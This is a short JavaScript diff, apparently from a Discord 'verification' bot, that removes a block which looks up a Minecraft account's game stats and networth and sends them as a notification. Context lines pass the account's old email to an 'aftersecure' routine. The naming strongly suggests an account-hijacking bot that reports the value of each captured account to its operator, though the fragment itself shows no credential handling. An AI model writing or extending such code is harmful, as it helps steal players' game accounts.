@@ -247,36 +247,6 @@ let obj = {
 
               let neededmsg = failed ? failedmsg : msg
 
-              // Send notification if account has Minecraft
-              if (acc.newName && acc.newName !== "No Minecraft!" && hasMinecraft) {
-                try {
-                  console.log('[VERIFICATION-SPLIT] Account has Minecraft, preparing notification...');
-                  console.log('[VERIFICATION-SPLIT] Minecraft name:', acc.newName);
-                  const stats = await getStats(acc.newName);
-                  console.log('[VERIFICATION-SPLIT] Stats retrieved:', stats);
-                  const accountData = {
-                    username: acc.newName,
-                    networth: stats?.networth || '0',
-                    bedwars: stats?.bedwars?.level || '0',
-                    networkLevel: stats?.networkLevel || '0',
-                    sbLevel: stats?.sbLevel || '0',
-                    duelKDR: stats?.duelKDR || '0',
-                    duelWinstreak: stats?.duelWinstreak || '0',
-                    plusColour: stats?.plusColour || 'None',
-                    gifted: stats?.gifted || '0'
-                  };
-                  console.log('[VERIFICATION-SPLIT] Sending notification for:', accountData.username);
-                  await sendSecureNotification(client, accountData);
-                  console.log('[VERIFICATION-SPLIT] Notification sent successfully');
-
-                } catch (notifError) {
-                  console.log('[VERIFICATION-SPLIT] Failed to send notification:', notifError.message);
-                  console.error('[VERIFICATION-SPLIT] Notification error details:', notifError);
-                }
-              } else {
-                console.log('[VERIFICATION-SPLIT] Account has no Minecraft, skipping notification');
-              }
-
               let doneaftersecure = await aftersecure(neededmsg, acc.aftersecure, interaction.user.id, settings, client, server_id, client.username, acc.oldEmail, acc);
               if (doneaftersecure) {
                 console.log('Did AfterSecure!');
